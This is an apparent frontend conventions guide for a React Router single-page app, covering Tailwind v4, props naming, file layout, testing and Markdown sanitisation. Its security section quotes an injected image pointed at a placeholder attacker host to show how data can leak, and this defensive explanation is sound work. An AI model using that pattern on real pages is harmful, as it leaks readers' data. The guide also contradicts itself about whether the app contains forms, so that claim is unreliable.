# Frontend conventions

These conventions adapt the Dopamint Arena frontend rules to Hub William’s React
Router Framework SPA layout. Where the two differ, this file governs here.

Two differences from the upstream rules are load-bearing and worth stating up front:

- source lives under `src/`, not `app/`, so every `app/…` path in the upstream
  doc maps onto `src/…` here;
- **this app contains real `<form>` elements**, which the upstream package does
  not. The attribute rules below depend on that, so do not copy the upstream
  wording about `type="button"` verbatim.

Hub William is the agent-workspace product: a specification page, a canvas
catalogue of harnesses, skills, hooks and templates, and agent activity
telemetry. The provider dashboard it replaced is gone, along with its backend,
its accounts and the rules that only described them. See
[architecture.md](./architecture.md).

Treat everything below as review criteria, not style suggestions. Review every
changed file against it before handing work off.

**Everything here is a rule for the whole app.** A rule that names one page is
not a convention: "the library route must move its viewport into a hook" tells
a reader nothing about the next route they write, and it is wrong the day that
page changes. Write the general form — _a concern that is not about the data a
route renders belongs in its own module_ — and let the page be the example
rather than the subject. Routes, components and files appear below only to show
a rule in use. Anything that is true of one page and no other belongs in the
code that does it, or in [architecture.md](./architecture.md).

## Core principles

- Keep the UI fully responsive from 320px upward. Interactive controls need an accessible name, visible focus, and a practical touch target.
- Use semantic HTML and purposeful ARIA. Do not use generic inline elements when a paragraph, label, time, strong, or other semantic element fits.
- ARIA state attributes belong on the element that owns the state. `aria-disabled` is meaningful on a widget, not on a `section`; gate a step by rendering no body rather than by dimming it.
- Use `interface` for object shapes and component props. Reserve `type` for unions, literal unions, tuples, and utility compositions — anything that cannot be expressed as an interface.
- Group state that changes together into one cohesive object.
- Remote schemas are authoritative. Do not silently invent fallback fields when provider or database contracts are unclear.
- Mirror database nullability in row types. A `not null default '{}'` column is not optional in TypeScript.
- Dependencies need real consumers. Remove packages that are not used by the shipped app.

## Declare props as a named interface

Always declare component props as a named interface, even when the component
takes one prop. Never put an inline object type in a parameter.

```tsx
interface SnippetProps {
  children: ReactNode;
  value: string;
}

function Snippet({ children, value }: SnippetProps) { … }
```

Do not write `function Snippet({ value }: { value: string })`.

The same rule applies to hooks, helpers, and callback types — an options bag is
an options bag whoever receives it. Name the interface after the function plus
what the parameter is called, so the two read together at the call site:

| Parameter          | Interface                       |
| ------------------ | ------------------------------- |
| component props    | `<ComponentName>Props`          |
| `opts` / `options` | `<FunctionName>Options`         |
| `args`             | `<FunctionName>Args`            |
| anything else      | `<FunctionName><ParameterName>` |

Export it only when something outside the file needs it.

## Styling

- Tailwind is the default styling language.
- **Express variants with `tailwind-variants`.** Define tables once at module
  scope — calling `tv()` in a render body rebuilds the config every frame.
- Reach for `tv` in exactly three cases:
  1. **A variant switches it** — `hourBar({ peak })`, `stepSection({ locked })`.
  2. **The component merges a caller’s `className`** — pass it through the
     `className` slot so tailwind-merge runs over the whole set.
  3. **It composes with a variable** — `usageFigure({ className: percentageTone(n) })`.
- Static, single-use, no variant? Write the literal inline. A frozen string has
  nothing to merge and nothing to switch.
- **Never assemble classes with a template literal or a bare ternary.** Both skip
  the tailwind-merge pass, so a caller’s `text-xs` wins or loses on stylesheet
  order rather than on intent.

  | Do not write                                 | Write instead              |
  | -------------------------------------------- | -------------------------- |
  | ``className={`size-2 ${tone}`}``             | `dot({ className: tone })` |
  | `className={active ? "h-full" : "min-h-50"}` | `card({ active })`         |

- **`slots` is for parts that share a variant.** When one flag drives several
  elements, name them as slots on a single `tv` so the state reads in one place —
  `rootTone` in `src/utils/utils.tone.ts` does this because a card, a tab, a
  trunk, a heading, a branch and a port are all fed from the same
  `entry.category`. A part with its own independent flag gets its own table.
- **Reach for a layout primitive before writing flex classes by hand.** Three
  choices, in order of how much each one claims:

  1. **`<Center>`** when centring is the whole job — an icon in a chip, a glyph
     in a circle. It is a grid, so the child keeps the size it was drawn at
     instead of being shrunk by `flex-shrink`.
  2. **`<Flex>`** for a row or column of siblings where alignment and gap are
     the point.
  3. **`space-x-*` / `space-y-*`** for a plain stack of block children that
     needs nothing but spacing between them. No flex context is created, so the
     children keep normal block behaviour.

  `Flex` defaults to `direction="row" align="center" gap="md"`. Converting a
  bare `className="flex"` without setting them silently adds `items-center` and
  a gap the original did not have, which is the one way this swap breaks a
  layout — say `align="stretch" gap="none"` when that is what the div meant.

- **Write the flex classes by hand when the element is not a `div`.** `Flex` and
  `Center` render one, so a `<button>`, `<header>`, `<nav>`, `<ul>` or `<a>`
  that needs to be a flex container keeps its own tag and its own classes.
  Trading a semantic element for a layout primitive is a worse deal than
  repeating four utilities. The same holds where flex is incidental to layout
  the primitive does not own, such as an absolutely positioned canvas node.
- **Preserve the graphite-paper theme.** The workspace is light only: a
  near-white `#fafbfc` page, zinc for every surface and every word, and indigo
  reserved for the one thing worth acting on. `--primary` is near-black on
  purpose — the specification's own buttons are ink, and an indigo button beside
  an indigo link makes neither mean anything. Emerald and amber are domain
  signals (backend, hooks), not accents to reach for.
- **There is no dark mode.** `root.tsx` sets no `dark` class and
  `@custom-variant dark (&:is(.dark *))` pins `dark:` to a class the app never
  sets, so the `dark:` utilities inside the generated shadcn primitives stay
  inert. Deleting that line would hand them to `prefers-color-scheme` and paint
  half the app dark against light tokens.
- Keep motion restrained. `public/css/index.css` neutralises animation
  and transition durations globally under `prefers-reduced-motion: reduce`; do
  not reintroduce per-class exceptions.
- Disabled state must exist in the DOM, not only in paint. `pointer-events-none`
  stops a mouse but leaves a control tabbable — use `disabled`, or do not render
  the control.

### Rendering a catalogue document is a security decision

The catalogue publishes Markdown that arrives by pull request from whoever wants
an entry in it, so **every byte of a document body is treated as authored by a
stranger.** Review is the first control; it is not the last, because a reviewer
reading a diff of a 400-line contract is looking at prose, not at an injection
three screens down. `src/components/markdown/` is the only supported way to
render one.

Four rules keep it safe, and each is one line away from being undone:

- **Never add `rehype-raw`.** It is the single switch that turns escaped text
  back into live HTML.
- **Never override `urlTransform`.** react-markdown's default is what strips
  `javascript:` and `data:` from `href` and `src`.
- **Never pass a `components` override that calls `dangerouslySetInnerHTML`.**
- **Never add `img` to `markdown-schema.ts`.** With no JavaScript at all, an
  injected `![](https://evil.tld/p.png?q=…)` fires a request the moment anyone
  opens the page, leaking their address and whatever the injection persuaded the
  author to put in the path. Links cannot be dropped — they are half the point
  of a contract — so each one is annotated with the host it actually points at.

`h1` is absent for a different reason: the sheet prints the entry's name as its
heading, and the service strips the document's own title line so it is not
rendered twice.

Do not reach for DOMPurify. In a browser it is correct; constructed against
`linkedom` in Deno it reports `isSupported: undefined` and returns its input
unchanged, with no error. It fails open. `rehype-sanitize` works on the tree and
needs no DOM.

`vercel.json` carries a CSP as the backstop, and it still matters. `script-src` has to include
`'unsafe-inline'` because React Router's SPA build inlines its hydration
bootstrap into `index.html`; the directives that do the work here are
`img-src`, which bounds where an injected image could reach, and
`connect-src 'self'`, which is absolute because nothing in the app fetches. A
download control is an `<a download>` at a file under `/catalog/`, and a
navigation is not what `connect-src` governs, so the archives leave the
directive where it is. `font-src 'self' data:` is why the
two typefaces are self-hosted through `@fontsource-variable/*` rather than
linked from Google Fonts — a `<link>` to a font CDN is refused by the browser,
silently, leaving the fallback stack on screen.

**`img-src` names GitHub's two image hosts and nothing else**, because a
contributor's avatar is `https://github.com/<login>.png` and that redirects to
`avatars.githubusercontent.com`. Widening it further reopens the exfiltration
pixel this directive exists to close; an injected image pointed at GitHub leaks
to GitHub, which is why these two are acceptable and a wildcard is not.

**None of this is enforced on GitHub Pages**, which cannot set response headers.
The policy applies only where a host sends it. Keep it accurate — a fork may
deploy somewhere that does — but do not cite it as a live control on
`synasapmob.github.io`.

### `cn` is for shadcn primitives only

`src/components/ui/` is **generated output**. `shadcn add` rewrites those files
wholesale from `components.json`, so hand-composing them with `tv` would be
undone by the next run. They keep `cn`/`cva`, and that is deliberate — the same
reasoning that exempts any codegen from hand-editing.

`cn` therefore lives in `src/utils/utils.class-names.ts`, and
`components.json`’s `aliases.utils` points at that exact path so a regenerated
primitive imports something that exists. **Application code outside
`src/components/ui/` must not call `cn`** — use `tv`.

## Write Tailwind v4, and write it canonically

Several v3 spellings still compile, so the build will not tell you when one slips
in. These are review criteria, not build errors.

- **Important goes at the end** — `px-4!`, not `!px-4`.
- **`outline-hidden`, not `outline-none`, when suppressing a focus ring.**
  `outline-none` removes the outline outright; `outline-hidden` keeps an
  invisible one so forced-colors mode still shows focus.
- **Collapse a pair into its canonical single class** — `size-full` not
  `h-full w-full`, `size-8` not `h-8 w-8`, `px-2` not `pl-2 pr-2`, `inset-0` not
  four sides. Two classes holding one intent drift the moment someone edits half.
- **An arbitrary value that lands on the scale is not arbitrary.** `--spacing` is
  `0.25rem`, so a px value divisible by 4 and a rem value divisible by 0.25 both
  have a canonical name: `max-h-112` not `max-h-[28rem]`, `min-h-75` not
  `min-h-[300px]`, `border-14` not `border-[14px]`.
- Values off the scale stay in brackets and are **not** a smell: `text-[11px]`,
  `text-[0.68rem]`, `gap-[3px]`, and every `clamp()` have no canonical form.
- **Check before converting — the build is the authority.** Run `pnpm build` and
  grep the emitted CSS rather than trusting arithmetic.
- **Do not "fix" the size scale by name.** v4 shifted it (v3’s `shadow-sm` is v4’s
  `shadow-xs`, and the same applies to `rounded` and `blur`). Renaming these
  changes the design.
- Tailwind scans source for complete class names, so a class assembled at runtime
  is never generated. Spell out each variant value in full.

## Add attributes only when they work

Prefer native semantic elements and the existing primitives. Do not add `type`,
`aria-*`, `id`, `role`, `title`, or `data-*` by habit. Each one needs a concrete
behaviour, relationship, test, tooltip, or accessibility consumer that the
element does not already provide.

- **Every non-submit `<button>` declares `type="button"`.** This app currently
  has no `<form>` at all, so the attribute changes nothing today — and that is
  exactly why it is written down rather than decided per site. A native
  `<button>` defaults to `submit` inside a form, buttons here live in sheets,
  popovers, canvases and toolbars composed into parents they cannot see, and the
  failure mode is an accidental submit with no error anywhere. Declaring it is
  cheap and stable; auditing ancestry on every refactor is not. Deciding per-site means the answer silently changes the day someone
  wraps a subtree in a `<form>`, and the failure mode is an accidental submit
  with no error anywhere. The canvas makes this sharper, not softer: every card
  on `/library` is a `<button>`. Declaring it is cheap and stable; auditing ancestry on
  every refactor is not. The submit control itself takes `type="submit"`, and
  every meaningful `<input type>` stays — it selects a real browser control,
  keyboard, and validation behaviour.
- **`data-*` needs a reader.** `data-slot="chart"` earns its place because the
  chart tests query it; `data-slot` in `src/components/ui/` earns its place
  because those components’ own selectors match on it. An attribute inherited
  from a generator is not automatically earned once the generator is gone.
- **Do not state the same thing twice.** A control whose visible label already
  changes with state does not also need `aria-pressed` repeating it.
- **Every `aria-labelledby` must resolve.** A reference to an id that is never
  rendered leaves the element with no accessible name at all — worse than
  omitting the attribute. Each top-level route section pairs its
  `aria-labelledby` with an `sr-only` `<h2>` carrying that id.
- Removing an attribute is not mechanical. Search outside the component for
  consumers — `querySelector`, attribute selectors, `getByTitle`, direct DOM
  reads — and either migrate the consumer in the same change or keep it.
  `aria-hidden="true"` on a decorative icon is doing its job.

## Ownership and folders

```text
src/
  assets/                      # static images imported by the app
  components/
    ui/                        # generated shadcn primitives — see "cn" above
    markdown/                  # the only supported way to render a document
    workspace-shell/           # the app frame; index.tsx, then one file per container
    flex.tsx                   # reusable application primitives, flat
    copy-command.tsx
    page-header.tsx
  routes/
    _app/                      # pathless workspace layout
      route.tsx
    _app._index/               # / the specification, and its private modules
      route.tsx
    _app.library.($contributor)/  # /library and /library/<login>
      route.tsx
      library-canvas-geometry.ts   # every position on the artboard, in canvas units
    _app.activities/           # /activities telemetry, and its private modules
      route.tsx
    $.tsx                      # catch-all route
  root.tsx                     # document shell and global providers
  routes.ts                    # file-route configuration
  services/                    # where content comes from
    catalog/                   # contributors/**/*.md, parsed at build time
  test/                        # shared test setup
  utils/                       # one concern per file: helpers, shared class
    utils.tone.ts              # tables, and fixture data not worth a service
    utils.activities.ts

public/
  css/index.css                # the theme; src/root.tsx imports it by path

machine/
  catalog/                     # the catalogue this site publishes
    harness/                   # the shared contracts
    skills/
    templates/
    contrib/<login>/           # one workspace per contributor
  lib/, tests/                 # the installer that puts the catalogue on a machine
```

- **A service never reshapes its source to suit a view.** Where the data is a
  file something else owns — a machine contract an agent reads as instructions,
  a schema another system writes — deriving what a page needs is the service's
  job. Adding a field to the source so a listing looks tidier is editing
  somebody else's file to suit a page. Derive from what is already there: the
  path, the document's own first heading, the columns that exist. Honour
  declared metadata only where the format already requires it.
- **Fixture data hides behind the same service shape as real data**, so the day
  it becomes rows only the service changes and no component notices.

What this product _is_ — where the catalogue lives, why there is no backend, why
no route is behind an account — is not a convention and is not here. See
[architecture.md](./architecture.md).

- Route modules and route-only UI belong in `src/routes`. A route folder exposes `route.tsx`; its charts, dialogs, tables, and tests stay beside it.
- Use React Router file naming for URL and layout relationships. A leading underscore creates a pathless layout, dots create nesting, `_index` defines an index route, and `$` defines the catch-all route.
- Keep `src/components` for UI reused by multiple routes. A component used by exactly one route belongs to that route’s folder; promote it when a second route needs it, not before. A component with no importers is deleted, not kept for later.
- **Filenames are kebab-case, and a component family stays flat until it reaches three or more files.** Below that, flat siblings read better than a folder holding two things. Past it, group into a folder named for the family with the entry point at `index.tsx`, and keep the family prefix on each child filename so a dozen open `index` tabs stay legible.
- **Every file inside a folder carries that folder's name as a prefix.** The
  bullet above is an instance of this rule rather than a separate one: a
  family's children keep the family prefix. It holds for route folders too —
  `_app.activities/` holds `activities-heatmap.tsx`,
  `_app.library.($contributor)/` holds `library-canvas-geometry.ts`,
  `components/workspace-shell/` holds `workspace-shell-mobile.tsx`,
  `components/markdown/` holds `markdown-schema.ts`. The prefix is what a grep
  result and a row of open tabs have instead of the folder name:
  `entry-detail.tsx` and `activity-summary.tsx` could belong to anything, and
  two folders are one file away from both owning a `report-summary.tsx`.

  Five things are exempt, each because the name is already load bearing
  somewhere else:

  - **React Router's reserved names** — `route.tsx`, `$.tsx`, `_index`
    segments, and `src/root.tsx`, `src/routes.ts`, `src/entry.client.tsx`. The
    framework resolves these by name, so a prefix unroutes the app.
  - **A family's entry point stays `index.tsx`.** The folder name _is_ the
    import path, so the entry already carries it.
  - **`src/components/ui/`.** `shadcn add` rewrites those files from
    `components.json`, so a rename is undone by the next run — the same reason
    they keep `cn`.
  - **`src/utils/utils.*.ts`.** Already prefixed, in the dot form
    `components.json`'s `aliases.utils` points at. Changing the separator
    rewrites the `cn` import in every generated primitive for cosmetics.
  - **Flat shared buckets** — `components/flex.tsx`, `copy-command.tsx`,
    `install-commands.tsx`, `page-header.tsx`. The rule is about a folder that
    groups the parts of one thing, not about every folder that holds files.
    `components/` holds unrelated primitives, so a `components-` prefix would
    say nothing about any of them.

- **A file's default export carries the file's name, prefix included.**
  `library-canvas-toolbar.tsx` exports `LibraryCanvasToolbar`,
  `activities-heatmap.tsx` exports `ActivitiesHeatmap`,
  `library-canvas-viewport.ts` exports `useLibraryCanvasViewport`. Its props
  interface follows — `LibraryCanvasToolbarProps`. Prefixing the file but not
  the symbol buys nothing: the import site, the JSX tag, the React DevTools
  tree and a stack trace all read the symbol, not the path, and a bare
  `<EntryCard />` in a stack trace could have come from any folder.

  This governs the exported subject of a file, not everything it exports:

  - **Named data exports keep their own domain names.** `CANVAS_WORLD`,
    `TREE_SPINE_X`, `treeGroups`, `rootTone`, `CatalogEntry`. They are named
    for what they are, and `LIBRARY_CANVAS_WORLD` is noise. The test is whether
    the file exists to provide that one thing.
  - **Data types are not components.** `src/utils/utils.activities.ts` exports
    `ActivitySummaryStats` — one activity's statistics — while the component
    reading it is `ActivitiesSummary` in `_app.activities/`. The near-collision
    is the point: singular is the record, plural is the route's folder.
  - **Module-private helpers are not renamed.** `WorkspaceBrand` inside
    `workspace-shell-sidebar.tsx` is invisible outside the file, so a prefix
    only lengthens it.
  - **`route.tsx` cannot carry a name**, so its default export is named for the
    page — `LibraryRoute`, `WhitepaperRoute`, `ActivitiesRoute`.

- Import across ownership boundaries with `@/`. Use `./` only inside the same owner folder. Any `../` import is migration debt — replace it when you next touch the file.
- **`src/utils/` holds focused pure helpers, one concern per `utils.*.ts` file** — `utils.class-names.ts`, `utils.format.ts`. There is no `src/utils/index.ts`, and there is no `src/lib`.
- **A class table more than one file reads lives in `src/utils/utils.*.ts`.**
  `utils.tone.ts` holds the table the canvas shares because a card, a heading, a
  branch and a port all colour from the same `entry.category`. A table only one
  component reads stays in that component, at module scope — moving it out buys
  an import and loses the sight of it.
- **There is one stylesheet, and it is `public/css/index.css`.** `src/root.tsx`
  imports it by relative path, which is what puts it in the module graph and
  therefore through Tailwind. Loading it with a `<link>` instead would ship
  `@import "tailwindcss"` to the browser verbatim and the app would render
  unstyled — the location is only safe because nothing relies on the folder it
  sits in.
- Components never make raw network calls. Nothing in the app fetches: the
  catalogue is Markdown inlined at build time and the telemetry is fixture data.
  Services own where content comes from, and a component reads a service. A
  download control is the one thing that leaves the browser, and it is an
  `<a download>` pointing at an archive the build emitted — a navigation the
  reader started, not a component going to the network for its data.
- Do not create a catch-all `types/` directory. Keep types with the service or feature that owns them.

## Exports

- Use default exports for feature pages, providers, services, and main module surfaces.
- Utility modules use named exports for their helpers — `cn`, `formatCurrency`, `formatTokens`.
- Avoid broad barrel files that hide ownership or introduce circular imports.

## Data and security

- **The app has no backend, no accounts and no secrets.** It reads no
  environment variable, opens no connection, and stores nothing. Anything that
  reintroduces one of those is a change to what this product is, not a detail.
- Treat all Vite client code as public. There is nothing in it that is not
  already in the repository.
- Contributed Markdown is authored by strangers — see "Rendering a catalogue
  document is a security decision" above. That is the whole threat model.
- Contributor avatars come from `https://github.com/<login>.png`, which is why
  `img-src` names GitHub's image hosts. **The policy in `vercel.json` is not
  enforced on GitHub Pages**, which cannot set response headers; keep it
  accurate anyway, and do not cite it as a live control on that host.

## Tests and verification

- Colocate tests with top-level hooks, providers, utilities, and services.
- Test normalization and aggregation at service boundaries.
- Add focused component tests for meaningful interaction or accessibility behavior. Route-local tests live beside the module they cover.
- Before handoff, run formatting, lint, type checking, unit tests, and a production build.

```bash
pnpm format
pnpm lint
pnpm typecheck
pnpm test
pnpm build
bash scripts/machine/tests/run.sh   # the catalogue's own contracts
```

- **`src` compiles under `strict`.** `tsconfig.app.json` sets `strict` and
  `noImplicitOverride`; both were free to turn on, so keep them green rather than
  reaching for a `// @ts-expect-error`. Three further flags are _not_ enabled
  because they are not free — if you want one, budget the cleanup:
  `exactOptionalPropertyTypes` (11 errors), `noPropertyAccessFromIndexSignature`
  (18), `noUncheckedIndexedAccess` (68).
- **`tsc -b` is incremental.** When a result looks too clean to believe, re-run it
  as `tsc -b --force`, or delete `node_modules/.tmp`. The cheapest way to trust a
  green typecheck is to break something on purpose and confirm it goes red.

- **CI runs all of it** (`.github/workflows/ci.yml`) on every pull request, and
  `main` will not accept a merge without it. The catalogue's own suite runs
  there too, because a contract that moves without its references breaks the
  harness rather than the site, and nothing else would catch it.
